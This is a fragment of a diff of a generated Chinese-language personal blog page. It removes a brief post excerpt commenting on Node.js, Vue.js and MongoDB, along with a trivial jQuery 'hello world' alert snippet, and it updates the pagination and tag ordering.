-<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>对于一个前前端的全栈工程师来说，Node.js是非常好的语言，并且学习社区非常完善，资料健全，很有意思。</p>
-<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue是一个很容易上手的框架，单页面应用也是非常好的一个前端网页思路，有效地减少白屏带来的视觉问题。<br>这两天在做搭个人网站的时候用上了Vue，打包完也有2M左右，组件太丰富，选择是一个问题。</p>
-<h2 id="MongoDb"><a href="#MongoDb" class="headerlink" title="MongoDb"></a>MongoDb</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="string">'hello world'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>数据库的选择，效率不错，API也很好使用。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2017/01/16/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2017/01/22/localStorage缓存机制/">展开全文 >></a>
         </p>
       
 
@@ -685,7 +500,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/blog/">&laquo; Prev</a><a class="page-number" href="/blog/">1</a><span class="page-number current">2</span>
+      <a class="extend prev" rel="prev" href="/blog/">&laquo; Prev</a><a class="page-number" href="/blog/">1</a><span class="page-number current">2</span><a class="page-number" href="/blog/page/3/">3</a><a class="page-number" href="/blog/page/4/">4</a><a class="extend next" rel="next" href="/blog/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -796,11 +611,11 @@ if ("serviceWorker" in navigator) {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">后端</a>
+                <a href="javascript:void(0)" class="js-tag color1">Javascript</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Javascript</a>
+                <a href="javascript:void(0)" class="js-tag color3">后端</a>
               </li>
              
               <li class="article-tag-list-item">
